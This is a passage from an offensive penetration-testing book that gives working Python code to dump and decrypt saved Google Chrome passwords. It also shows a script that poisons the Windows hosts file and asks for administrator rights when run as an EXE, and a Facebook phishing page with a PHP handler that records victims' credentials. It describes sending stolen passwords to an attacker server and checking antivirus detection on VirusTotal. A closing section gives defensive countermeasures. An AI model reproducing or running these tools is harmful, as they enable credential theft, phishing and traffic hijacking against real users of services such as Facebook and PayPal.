<li value="6" class="calibre10">Now, let's see whether the same tool and the same technique will work with other websites. For this, we will close the Facebook page and go to<a href="https://www.paypal.com/in/signin" class="calibre8"> https://www.paypal.com/in/signin</a> to login. </li>
<li value="7" class="calibre10">Let's run our tool and go to the PayPal account. You will see that we get  the username and password that we used for the login. </li>
<li value="8" class="calibre10">Now, let's verify that this is the same password and username stored on LastPass. You just need to follow the same process as earlier. </li>
<li value="9" class="calibre10">We will try the same thing with Twitter by going to the Twitter log in page. </li>
<li value="10" class="calibre10">Run the tool here as usual, and, once we hit on the <span>Log In</span> button, we can see the email ID and the password.</li>
</ol>
<p class="calibre2">As we saw earlier, these values are in hexa format, and need to be converted into ASCII.</p>
<div class="packt_infobox">A little reminder that neither the keylogger or  the clipboard hijacking techniques that we saw earlier, will work in a similar scenario, and this is because we are not typing or pasting any data.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Dumping saved passwords out of Google Chrome</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will discuss another password-hacking technique. This technique was originally created to recover your password if you forget it. Here we will take advantage and hack the saved password remotely. For this attack to work successfully, your target should be using Google Chrome, and they should have previously saved the login password. Let's look at how this works. Log into your Facebook account. You will notice a prompt at the top-right corner of the screen, which asks you whether to save the password with a <span class="calibre11">Save password</span> button. If our target has clicked on <span class="calibre11">Save password</span>, then we will be able to grab that password remotely.</p>
<p class="calibre2">We will now see how to do that. To do this, we will <span class="calibre11">Log out</span> from Facebook first.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Acquiring the password remotely</h1>
                
            
            <article>
                
<p class="calibre2">Let's get started by understanding how Google Chrome stores and recovers the saved password in the first place:</p>
<div class="packt_figure1"><img src="../images/00041.jpeg" class="calibre48"/></div>
<p class="calibre2">So, the first fact is, we should know that Google Chrome uses the Windows login password as a key to do both the encryption and decryption phases. The second thing we need to know is that encrypted passwords are stored in a SQLite database called Login Data DB and that database is located in the path <kbd class="calibre12">C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default</kbd>.</p>
<p class="calibre2">Google Chrome calls a specific Windows API function called <kbd class="calibre12">CryptProtectData</kbd>, which utilizes the Windows login password as an encryption key. In reverse operation, a Windows API <kbd class="calibre12">CryptUnProtectData</kbd> is called to decrypt the password value back to clear text. Now let's summarize how Chrome works in saving passwords.</p>
<p class="calibre2">Let's assume that our target has logged into Facebook for the first time. Google Chrome will prompt them to save the password. If they click on <span class="calibre11">Save password</span>, then Google Chrome will take this password in a clear-text format and call the <kbd class="calibre12">CryptProtectData</kbd> API, which will encrypt this password using the Windows login password and save it in the login data database. Later on, when our target visits the Facebook page one more time, Google Chrome will retrieve the encrypted password and pass it to the <kbd class="calibre12">CryptUnProtectData</kbd> API function. After that, we will get the clear text password. Then, Google Chrome will submit it on your behalf.</p>
<p class="calibre2">Now technically, if we code a Python script to grab the encrypted password from the Chrome database and pass that value to <kbd class="calibre12">CryptUnprotectData</kbd> API function, then we should be able to see the saved password in a clear text format after that; that's exactly what we'll do here.</p>
<p class="calibre2">Before moving to the coding part, let's have a look at the SQL database. Here, we will be using a free open source database browser for SQLite:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Navigate to SQLite, which gets created by Google Chrome. In my case, the path is <kbd class="calibre12">C:\Users\Hussam\AppData\Local\Google\Chrome\User Data\Default</kbd> that Chrome creates its database, and we will copy the <kbd class="calibre12">Login Data</kbd> file to the desktop. </li>
<li value="2" class="calibre10">We have to change the extension to SQLite so that we can import it in the database browser. </li>
<li value="3" class="calibre10">So all we have to do right now is click on <span>Open Database</span> and go to the <span>Desktop</span> to open <kbd class="calibre12">Login Data.sqlite3</kbd>. </li>
<li value="4" class="calibre10">Once we import it, you can see that there is a table called <kbd class="calibre12">logins</kbd>. </li>
<li value="5" class="calibre10">Once we click on <span>Browse Data</span>, we can see some interesting columns:</li>
</ol>
<div class="packt_figure1"><img src="../images/00042.jpeg" class="calibre49"/></div>
<p class="calibre50"><kbd class="calibre12">action_url</kbd> is the URL that the user navigated to when submitting the login credentials, and in our case, it's a Facebook URL. The value, or <kbd class="calibre12">username_value</kbd> and the <kbd class="calibre12">password_value</kbd> are the values of the username and the password that have been submitted.</p>
<ol start="6" class="calibre13">
<li value="6" class="calibre10">We need to locate the SQLite database, as the <kbd class="calibre12">USERNAME</kbd> directory is a variable and will be different from one PC to another.</li>
</ol>
<div class="packt_tip">We need to grab the values of <kbd class="calibre22">action_url</kbd> and <kbd class="calibre22">username_value</kbd> and the <kbd class="calibre22">password_value</kbd> columns from that database.</div>
<ol start="7" class="calibre13">
<li value="7" class="calibre10">Finally, we pass <kbd class="calibre12">password_value</kbd> to the <kbd class="calibre12">CryptUnProtectData</kbd> function, or API function, to decrypt it back into clear text.</li>
</ol>
<p class="calibre2">So, let's start with the coding part:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Installing win32crypt<br class="title-page-name"/># http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/<br class="title-page-name"/><br class="title-page-name"/># Dumping Google Chrome Passwords <br class="title-page-name"/><br class="title-page-name"/>from os import getenv # To find out the Chrome SQL path which is &gt;&gt; C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data<br class="title-page-name"/>import sqlite3 # To read the Chrome SQLite DB<br class="title-page-name"/>import win32crypt # High level library to call windows API CryptUnprotectData<br class="title-page-name"/>from shutil import copyfile # To make a copy of the Chrome SQLite DB<br class="title-page-name"/><br class="title-page-name"/># LOCALAPPDATA is a Windows Environment Variable which points to &gt;&gt;&gt; C:\Users\{username}\AppData\Local<br class="title-page-name"/><br class="title-page-name"/>path = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data"<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># IF the target was logging into a site which has an entry into the DB, then sometimes reading the Chrome DB will return an error that the DB is locked <br class="title-page-name"/># OperationalError: database is locked<br class="title-page-name"/># The Workaround for this, is to make a copy the Login Data DB and pull data out of the copied DB<br class="title-page-name"/><br class="title-page-name"/>path2 = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login2"<br class="title-page-name"/>copyfile(path, path2)<br class="title-page-name"/>...</pre>
<p class="calibre2"><span class="calibre11">We will start with importing the necessary libraries:</span></p>
<ol class="calibre13">
<li value="1" class="calibre10">We will import <kbd class="calibre12">getenv</kbd>, to resolve the Windows environment variable and find out the Google Chrome SQL path.</li>
<li value="2" class="calibre10">Next, we import SQLite3 to read the Chrome SQLite database and fetch its raw values.</li>
<li value="3" class="calibre10">We import <kbd class="calibre12">win32crypt</kbd>, which provides a high-level library to call the Windows API <kbd class="calibre12">CryptUnProtectData</kbd>. Keep in mind that, in order to use this library, we need to first install the <kbd class="calibre12">pywin32</kbd> library from <a href="http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/" class="calibre8">http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/</a>.</li>
</ol>
<p class="calibre2"><kbd class="calibre12">LOCALAPPDATA</kbd> is a Windows environment variable, which points to <kbd class="calibre12">C:\Users</kbd>, then <kbd class="calibre12">username</kbd>, and then the <kbd class="calibre12">AppData\Local</kbd> path—and that is half of our full path. So, once we've got this part, all we have to do is append the second part of the path by adding <kbd class="calibre12">\Google\Chrome\User Data\Default\Login Data</kbd> to get the absolute path of the <kbd class="calibre12">Login Data</kbd> database.</p>
<p class="calibre2">If the target is logging into a site, which has an entry into the database, then sometimes reading the Chrome database will return an error that the database is locked; and you will get an exception called <kbd class="calibre12">database is locked</kbd>, once you run the Python script. In our example, if the target is logged into Facebook at the time that we want to read from the Chrome database, then we want to be able to do that. The workaround for this is to make a copy of the login database and pull the data out of the copied database. So here, the copied database has the name <kbd class="calibre12">Login2</kbd>, and it's located on the same directory as the original one. And, at this point, we have accomplished the first step of locating the database.</p>
<p class="calibre2">Since the original database can be locked, we will read data from the copied database. We'll do this using the <kbd class="calibre12">sqlite3.connect</kbd> function, pointing to the copied database path:</p>
<pre class="packt_figure">...<br class="title-page-name"/># Connect to the copied Database<br class="title-page-name"/>conn = sqlite3.connect(path2)<br class="title-page-name"/><br class="title-page-name"/>cursor = conn.cursor() # Create a Cursor object and call its execute() method to perform SQL commands like SELECT<br class="title-page-name"/><br class="title-page-name"/># SELECT column_name,column_name FROM table_name<br class="title-page-name"/># SELECT action_url and username_value and password_value FROM table logins<br class="title-page-name"/>cursor.execute('SELECT action_url, username_value, password_value FROM logins') <br class="title-page-name"/>...</pre>
<p class="calibre2">Then, we create a cursor object so that we can execute the SQL queries to pull out the desired columns. If you remember, the table name was <kbd class="calibre12">login</kbd> and it has three important columns, which are <kbd class="calibre12">username</kbd> and <kbd class="calibre12">password_value</kbd>, along with the <kbd class="calibre12">action_url</kbd>.</p>
<p class="calibre2">So, we'll select these columns and fetch their values using a <kbd class="calibre12">for</kbd> loop with a <kbd class="calibre12">fetchall</kbd> function:</p>
<pre class="packt_figure">...<br class="title-page-name"/># To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.<br class="title-page-name"/>for raw in cursor.fetchall():<br class="title-page-name"/>    <br class="title-page-name"/>    print raw[0] + '\n' + raw[1] # print the action_url (raw[0]) and print the username_value (raw[1])<br class="title-page-name"/>...</pre>
<p class="calibre2">The result will be a list stored in a raw variable. Then, we'll print the first two values in this list, which are <kbd class="calibre12">action_url</kbd> and <kbd class="calibre12">username_value</kbd>. So, by doing that at this point we have achieved the second step of our plan, and we grabbed the data out of a Chrome database.</p>
<p class="calibre2">The last step would be to call the <kbd class="calibre12">CryptUnProtectData</kbd> API function and pass the encrypted password, which is by the way stored in the third element of our raw list. Finally we'll print out the result:</p>
<pre class="packt_figure">...    <br class="title-page-name"/>password = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it <br class="title-page-name"/>    print password # print the password in clear text<br class="title-page-name"/>    <br class="title-page-name"/>conn.close()</pre>
<p class="calibre2">Now, upon running the module you will see that we get <span class="calibre11">three items: the URL, the username, and the clear-text password. </span></p>
<p class="calibre2">Try to double-check that these are the correct credentials to log into my Facebook account. Also try with other websites like Twitter, <span class="calibre11">PayPal, and so on. </span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Submitting the recovered password over HTTP session</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will modify our previous script to automate the submitting of the recovered or hacked password over the HTTP session. And then, we will send it back to the hacker machine, where the end result should be a standalone file, which can be used in post-exploitation or as a function integrated with a new Python shell.</p>
<p class="calibre2">We will start our HTTP server on the Kali machine to receive the hacked password of the target site. We will simply double-click on the Chrome Dumper EXE file. You will see that we were able to have the saved password remotely out of a Chrome database. Here, we grabbed the Facebook email and password, and also the Twitter account. Now, if we move to the target machine, we will see that the following are the two sessions that are currently open on the target site:</p>
<div class="packt_figure1"><img src="../images/00043.jpeg" class="calibre33"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Testing the file against antivirus</h1>
                
            
            <article>
                
<p class="calibre2">We will be using the well-known website, VirusTotal, and will upload our Google Dumper file.</p>
<p class="calibre2">For this, navigate to our <kbd class="calibre12">Chrome Dumper</kbd> file and <span class="calibre11">Upload and scan file</span>.<span class="calibre11"> </span>Upload the <kbd class="calibre12">Chrome Dumper</kbd><span class="calibre11"> file </span>and scan the content.</p>
<p class="calibre2">You will see how many antivirus could raise a flag. Now, I would say that we got a fair result if the number of antivirus raised is few, and if anybody can try and compile the script using <kbd class="calibre12">PyInstaller</kbd> and test it, then they could have a different result.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Password phishing – DNS poisoning</h1>
                
            
            <article>
                
<p class="calibre2">One of the easiest ways to manipulate the direction of the traffic remotely is to play with DNS records. Each operating system contains a host file in order to statically map hostnames to specific IP addresses. The host file is a plain text file, which can be easily rewritten as long as we have admin privileges. For now, let's have a quick look at the host file in the Windows operating system.</p>
<p class="calibre2">In Windows, the file will be located under <kbd class="calibre12">C:\Windows\System32\drivers\etc</kbd><span class="calibre11">. Let's have a look at the contents of the <kbd class="calibre12">host</kbd> file:</span></p>
<div class="packt_figure1"><img src="../images/00044.jpeg" class="calibre51"/></div>
<p class="calibre2">If you read the description, you will see that each entry should be located on a separate line. Also, there is a sample of the record format, where the IP should be placed first. Then, after at least one space, the name follows. You will also see that each record's that the IP address begins first, then we get the hostname.</p>
<p class="calibre2">Now, let's see the traffic on the packet level:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Open Wireshark on our target machine and start the capture.</li>
<li value="2" class="calibre10">Filter on the attacker IP address:</li>
</ol>
<div class="packt_figure1"><img src="../images/00045.jpeg" class="calibre52"/></div>
<p class="calibre45">We have an IP address of <kbd class="calibre12">10.10.10.100</kbd><span class="calibre11">, which is the IP address of our attacker. We can see the traffic before poisoning the DNS records. You need to click on</span> <span class="calibre11">Apply</span> <span class="calibre11">to complete the process.</span></p>
<ol start="3" class="calibre13">
<li value="3" class="calibre10">Open <a href="https://www.google.jo/?gws_rd=ssl" class="calibre8">https://www.google.jo/?gws_rd=ssl</a>. Notice that once we ping the name from the command line, the operating system behind the scene will do a DNS lookup:</li>
</ol>
<div class="packt_figure1"><img src="../images/00046.jpeg" class="calibre53"/></div>
<p class="calibre50">We will get the real IP address<span class="calibre11">. Now, notice what happens after DNS poisoning. For this, close all the windows except the one where the <span class="calibre11">Wireshark </span>application is running.</span></p>
<div class="packt_infobox">Keep in mind that we should run as admin to be able to modify the host file.</div>
<ol start="4" class="calibre13">
<li value="4" class="calibre10">Now, even though we are running as an admin, when it comes to running an application you should explicitly do a right-click and then run as admin.</li>
<li value="5" class="calibre10">Navigate to the directory where the <kbd class="calibre12">hosts</kbd> file is located.</li>
<li value="6" class="calibre10">Execute <kbd class="calibre12">dir</kbd> and you will get the <kbd class="calibre12">hosts</kbd> file. </li>
<li value="7" class="calibre10">Run <kbd class="calibre12">type hosts</kbd>. You can see the original host here.</li>
<li value="8" class="calibre10">Now, we will enter the command:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">echo 10.10.10.100 www.google.jo &gt;&gt; hosts</strong></pre>
<p class="calibre45"><kbd class="calibre12">10.10.100</kbd>, is the IP address of our Kali machine. So, once the target goes to <kbd class="calibre12">google.jo</kbd>, it should be redirected to the attacker machine.</p>
<ol start="9" class="calibre13">
<li value="9" class="calibre10">Once again verify the host by executing <kbd class="calibre12">type hosts</kbd>.</li>
<li value="10" class="calibre10">Now, after doing a DNS modification, it's always a good thing to flush the DNS cache, just to make sure that we will use the updated record. For this, enter the following command:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">ipconfig /flushdns</strong></pre>
<ol start="11" class="calibre13">
<li value="11" class="calibre10">Now, watch what happens after DNS poisoning. For this, we will open our browser and navigate to <a href="https://www.google.jo/?gws_rd=ssl" class="calibre8">https://www.google.jo/?gws_rd=ssl</a>. Notice that on Wireshark the traffic is going to the Kali IP address instead of the real IP address of <kbd class="calibre12">google.jo</kbd><span>. This is because the DNS resolution for</span> <kbd class="calibre12">google.jo</kbd> <span>was</span> <kbd class="calibre12">10.10.10.100</kbd><span>.</span></li>
<li value="12" class="calibre10">We will stop the capturing and recover the original <kbd class="calibre12">hosts</kbd> file. We will then place that file in the <kbd class="calibre12">drivers\etc</kbd> folder. </li>
<li value="13" class="calibre10">Now, let's flush the poisoned DNS cache first by running:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">ipconfig /flushdns</strong></pre>
<ol start="14" class="calibre13">
<li value="14" class="calibre10">Then, open the browser again. We should go to <a href="https://www.google.jo/?gws_rd=ssl" class="calibre8">https://www.google.jo/?gws_rd=ssl</a> right now. Now we are good to go!</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Using Python script</h1>
                
            
            <article>
                
<p class="calibre2">Now we'll automate the steps, but this time via a Python script.</p>
<p class="calibre2">Open the script and enter the following code:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># DNS_Poisoning<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>import subprocess<br class="title-page-name"/>import os<br class="title-page-name"/><br class="title-page-name"/>os.chdir("C:\Windows\System32\drivers\etc") # change the script directory to ..\etc where the host file is located on windows<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>command = "echo 10.10.10.100 www.google.jo &gt;&gt; hosts" # Append this line to the host file, where it should redirect<br class="title-page-name"/>                                                      # traffic going to google.jo to IP of 10.10.10.100<br class="title-page-name"/>CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br class="title-page-name"/><br class="title-page-name"/>command = "ipconfig /flushdns" # flush the cached dns, to make sure that new sessions will take the new DNS record<br class="title-page-name"/>CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</pre>
<p class="calibre2">The first thing we will do is change our current working directory to be the same as the <kbd class="calibre12">hosts</kbd> file, and that will be done using the <kbd class="calibre12">OS</kbd> library. Then, using subprocesses, we will append a static DNS record, pointing Facebook to <kbd class="calibre12">10.10.10.100</kbd>: the Kali IP address. In the last step, we will flush the DNS record. We can now save the file and export the script into EXE. </p>
<p class="calibre2">Remember that we need to make the target execute it as admin. To do that, in the setup file for the <kbd class="calibre12">py2exe</kbd>, we will add a new line, as follows:</p>
<pre class="packt_figure">...<br class="title-page-name"/><strong class="calibre1">  </strong>   windows = [{'script': "DNS.py", 'uac_info': "requireAdministrator"}],<br class="title-page-name"/>...</pre>
<p class="calibre2">So, we have added a new option, specifying that when the target executes the EXE file, we will ask to elevate our privilege into admin. To do this, we will require administrator privileges.</p>
<p class="calibre2">Let's run the setup file and start a new capture. Now, I will copy our EXE file onto the desktop. Notice here that we got a little shield indicating that this file needs an admin privilege, which will give us the exact result for running as admin. Now, let's run the file. Verify that the file host gets modified. You will see that our line has been added.</p>
<p class="calibre2">Now, open a new session and we will see whether we got the redirection. So, let's start a new capture, and we will add on the Firefox. As you will see, the DNS lookup for <kbd class="calibre12">google.jo</kbd> is pointing to our IP address, which is <kbd class="calibre12">10.10.10.100</kbd>.</p>
<p class="calibre2">In the next section, we will see how we can take advantage of this for password phishing.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Facebook password phishing</h1>
                
            
            <article>
                
<p class="calibre2">In the previous section, we have seen that with a few lines of Python code we can redirect traffic to the attacker machine instead of going to <a href="https://www.google.jo/?gws_rd=ssl" class="calibre8">https://www.google.jo/?gws_rd=ssl</a>. This time, we will see how an attacker can take advantage of manipulating the DNS record for Facebook, redirect traffic to the phishing page, and grab the account password.</p>
<p class="calibre2">First, we need to set up a phishing page.</p>
<div class="packt_infobox">You need not be an expert in web programming. You can easily Google the steps for preparing a phishing account.</div>
<ol class="calibre13">
<li value="1" class="calibre10">To create a phishing page, first open your browser and navigate to the Facebook login page. Then, on the browser menu, click on <span>File</span> and then on <span>Save page as...</span>. Then, make sure that you choose a complete page from the drop-down menu. </li>
<li value="2" class="calibre10">The output should be an <kbd class="calibre12">.html</kbd> file.</li>
<li value="3" class="calibre10">Now let's extract some data here. Open the <kbd class="calibre12">Phishing</kbd> folder from the code files provided with this book. Rename the Facebook HTML page <kbd class="calibre12">index.html</kbd><span>.</span></li>
<li value="4" class="calibre10">Inside this HTML, we have to change the login form. If you search for <kbd class="calibre12">action=</kbd><span>, you will see it. Here, we change the login form to redirect the request into a custom PHP page called</span> <kbd class="calibre12">login.php</kbd><span>. Also, we have to change the request method to</span> <kbd class="calibre12">GET</kbd> <span>instead of</span> <kbd class="calibre12">POST</kbd><span>.</span></li>
</ol>
<ol start="5" class="calibre13">
<li value="5" class="calibre10">You will see that I have added a <kbd class="calibre12">login.php</kbd> page in the same <kbd class="calibre12">Phishing</kbd> directory. If you open the file, you will find the following script:</li>
</ol>
<pre class="mce-root1">&lt;?php<br class="title-page-name"/>header("Location: http://www.facebook.com/home.php? ");<br class="title-page-name"/>$handle = fopen("passwords.txt", "a");<br class="title-page-name"/>foreach($_GET as $variable =&gt; $value) {<br class="title-page-name"/>fwrite($handle, $variable);<br class="title-page-name"/>fwrite($handle, "=");<br class="title-page-name"/>fwrite($handle, $value);<br class="title-page-name"/>fwrite($handle, "\r\n");<br class="title-page-name"/>}<br class="title-page-name"/>fwrite($handle, "\r\n");<br class="title-page-name"/>fclose($handle);<br class="title-page-name"/>exit;<br class="title-page-name"/>?&gt; </pre>
<p class="calibre50">As soon as our target clicks on the <span class="calibre11">Log In</span> button, we will send the data as a <kbd class="calibre12">GET</kbd> request to this <kbd class="calibre12">login.php</kbd> and we will store the submitted data in our <kbd class="calibre12">passwords.txt</kbd> file; then, we will close it.</p>
<ol start="6" class="calibre13">
<li value="6" class="calibre10">Next, we will create the <kbd class="calibre12">passwords.txt</kbd> file, where the target credentials will be stored. </li>
<li value="7" class="calibre10">Now, we will copy all of these files into <kbd class="calibre12">\var\www</kbd> and start the Apache services. </li>
<li value="8" class="calibre10">If we open the <kbd class="calibre12">index.html</kbd> page locally, we will see that this is the phishing page that the target will see.</li>
</ol>
<p class="calibre2">Let's recap really quickly what will happen when the target clicks on the <span class="calibre11">Log In</span> <span class="calibre11">button? As soon as our target clicks on the</span> <span class="calibre11">Log In</span> <span class="calibre11">button, the target's credentials will be sent as</span> <kbd class="calibre12">GET</kbd> <span class="calibre11">requests to</span> <kbd class="calibre12">login.php</kbd><span class="calibre11">. Remember that this will happen because we have modified the action parameter to send the credentials to</span> <kbd class="calibre12">login.php</kbd><span class="calibre11">. After that, the</span> <kbd class="calibre12">login.php</kbd> <span class="calibre11">will eventually store the data into the </span><kbd class="calibre12">passwords.txt</kbd> <span class="calibre11">file.</span></p>
<p class="calibre2">Now, before we start the Apache services, let me make sure that we get an IP address.</p>
<ol class="calibre13">
<li value="1" class="calibre10">Enter the following command:</li>
</ol>
<pre class="mce-root1"><strong class="calibre1">ifconfig eth0</strong></pre>
<p class="calibre45">You can see that we are running on <kbd class="calibre12">10.10.10.100</kbd> and we will also start the Apache service using:</p>
<pre class="calibre43"><strong class="calibre1">service apache2 start</strong></pre>
<ol start="2" class="calibre13">
<li value="2" class="calibre10">Let's verify that we are listening on port <kbd class="calibre12">80</kbd>, and the service that is listening is Apache:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">netstat -antp | grep "80"</strong></pre>
<p class="calibre2">Now, let's jump to the target side for a second.</p>
<p class="calibre2">In our previous section, we have used <kbd class="calibre12">google.jo</kbd> in our script. Here, we have already modified our previous script to redirect the Facebook traffic to our attacker machine. So, all our target has to do is double-click on the EXE file. <span class="calibre11">Now, to verify:</span></p>
<ol class="calibre13">
<li value="1" class="calibre10"> Let us start Wireshark and then start the capture.</li>
<li value="2" class="calibre10">We will filter on the attacker IP, which is <kbd class="calibre12">10.10.10.100</kbd>:</li>
</ol>
<div class="packt_figure1"><img src="../images/00047.jpeg" class="calibre54"/></div>
<ol start="3" class="calibre13">
<li value="3" class="calibre10">Open the browser and navigate to <a href="https://www.facebook.com/" class="calibre8">https://www.facebook.com/</a>:</li>
</ol>
<div class="packt_figure1"><img src="../images/00048.jpeg" class="calibre55"/></div>
<p class="calibre50">Once we do this, we're taken to the phishing page instead. Here, you will see the destination IP, which is the Kali IP address. So, on the target side, once we are viewing or hitting <a href="https://www.facebook.com/" class="calibre8">https://www.facebook.com/</a><span class="calibre11">, we are basically</span> <span class="calibre11">viewing </span><kbd class="calibre12">index.html</kbd><span class="calibre11">, which is set up on the Kali machine. </span>Once the victim clicks on the login page, we will send the data as a <kbd class="calibre12">GET</kbd> <span class="calibre11">request to</span> <kbd class="calibre12">login.php</kbd><span class="calibre11">, and we will store it into</span> <kbd class="calibre12">passwords.txt</kbd><span class="calibre11">, which is currently empty.</span></p>
<ol start="4" class="calibre13">
<li value="4" class="calibre10">Now, log into your Facebook account using your username and password. and jump on the Kali side and see if we get anything on the <kbd class="calibre12">passwords.txt</kbd> file. You can see it is still empty. This is because, by default, we have no permission to write data. Now, to fix this, we will give all files full privilege, that is, to read, write, and execute:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">chmod -R 777 /var/www/</strong></pre>
<div class="packt_infobox">Note that we made this, since we are running in a VirtualBox environment. If you have a web server exposed to the public, it's bad practice to give full permission to all of your files due to privilege escalation attacks, as an attacker may upload a malicious file or manipulate the files and then browse to the file location to execute a command on his own.</div>
<ol start="5" class="calibre13">
<li value="5" class="calibre10">Now, after giving the permission, we will <kbd class="calibre12">stop</kbd> and <kbd class="calibre12">start</kbd> the Apache server just in case:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">service apache2 stop<br class="title-page-name"/>service apache2 start<br class="title-page-name"/></strong></pre>
<ol start="6" class="calibre13">
<li value="6" class="calibre10">After doing this modification, go to the target machine and try to log into Facebook one more time. Then, go to Kali and click on <kbd class="calibre12">passwords.txt</kbd>. You will see the submitted data from the target side, and we can see the username and the password.</li>
</ol>
<div class="packt_infobox">In the end, a good sign for a phishing activity is missing the <kbd class="calibre22">https</kbd> <span>sign.</span></div>
<p class="calibre2">In the upcoming section, we will discuss how to protect yourself and secure your account from these attacks. Also, you need to make sure to turn off your Apache server once you're done with your assessment.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Countermeasures</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will discuss four methods that you can use to secure your online account. Note that these are not the only available methods. However, following these steps should give your account a fair level of security.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Securing the online account</h1>
                
            
            <article>
                
<p class="calibre2">So, let's start with using the security services provided by the vendor. I really recommend to enable Step 2 authentication (or sometimes called one-time password) on all of your accounts such as Gmail, LinkedIn, and PayPal whenever this option is available. And when you do so, once you decide to log in, it'll ask you for the username and password. And the second step is to enter the one-time password, which you will usually get via an SMS or application, or even by email. Now, this one-time password will be valid only for 30 seconds or less.</p>
<p class="calibre2">Here are few links which guide you on how easy and powerful it is to enable this feature for some services such as Gmail, Twitter, and so on:</p>
<ul class="calibre9">
<li class="calibre10">Gmail provides SMS and Gmail mobile app:
<ul class="calibre56">
<li class="calibre10"><a href="https://www.google.com/landing/2step/" class="calibre8">https://www.google.com/landing/2step/</a></li>
<li class="calibre10"><a href="https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;hl=en" class="calibre8">https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;hl=en</a></li>
</ul>
</li>
<li class="calibre10">Twitter provides mobile app and SMS:
<ul class="calibre56">
<li class="calibre10"><a href="https://support.twitter.com/articles/20170388" class="calibre8">https://support.twitter.com/articles/20170388</a></li>
</ul>
</li>
</ul>
<p class="calibre2">Before moving to the next point, I need to mention that even after enabling Step 2 authentication, we're still vulnerable to session hijacking vulnerability, where an attacker can hijack the session or the cookies after Step 2 authentication, and reinject that session on his own. One more thing you want to pay attention to is the login. Each time a new device is logged in your account, you will get a notification message, by email most likely, to inform you with this strange access. </p>
<p class="calibre2">And it will give you some kind of information such as the operating system or the timestamp. The preceding screenshot shows the Windows operating system, that has newly signed to your account. Also, it will advise you what to do if this was a suspicious activity.</p>
<p class="calibre2">To avoid this, you need to make sure that your password itself should be complex enough, and try to avoid trivial and weak passwords.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Securing your computer</h1>
                
            
            <article>
                
<p class="calibre2">We will now see how to secure your own device. When it comes to computers, the following are the steps you need to consider:</p>
<ul class="calibre9">
<li class="calibre10">Use a nonadmin account all the time</li>
<li class="calibre10">Keep your browser and system updated</li>
<li class="calibre10">Consider the countermeasures we discussed in the previous section</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Securing your network</h1>
                
            
            <article>
                
<p class="calibre2">Now, let's see how to secure your own network to protect your data in transit. If you have to use untrusted network, such as a cafe Wi-Fi, to access your sensitive data such as your bank account or PayPal account, then you should use a trusted VPN to establish a secure tunnel and prevent local LAN attacks. No doubt that VPN will add values such as authentication and encryption, which will be used to defeat local LAN attacks such as man-in-the-middle attacks.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Keeping a watch on any suspicious activity</h1>
                
            
            <article>
                
<p class="calibre2">Now, let's see how to keep your eyes open on anything abnormal on the login page, such as a missing https in the URL field is a good indicator for phishing activity, where the attacker can redirect your traffic to a malicious login page; or if the attacker is in between, like man-in-the-middle attack, he can use a tool such as SSL strip to strip off the SSL encryption and turn your data into clear text. </p>
<p class="calibre2">And if you are a security paranoid person, even if you see the <kbd class="calibre12">https</kbd> label in green, you can double-check the certificate status that you got from the website. For instance, this is a screenshot of a Facebook server certificate:</p>
<div class="packt_figure1"><img src="../images/00049.jpeg" class="calibre57"/> </div>
<p class="calibre2">We can see that it's issued to all Facebook domain, and we can see that the issuer is DigiCert.</p>
<p class="calibre2">Also, the certificate path will show us the health status for this certificate; and if there is any sub-CA or subcertificate authority and intermediate certificate in between.</p>
<p class="calibre2">Next, we should be really careful on sites that your browser shows a certificate error before showing the login page, as an attacker could set up a proxy server and provide you with a fake certificate to intercept the traffic during a man-in-the-middle attack. Each browser may show you a different notification for this certificate error. </p>
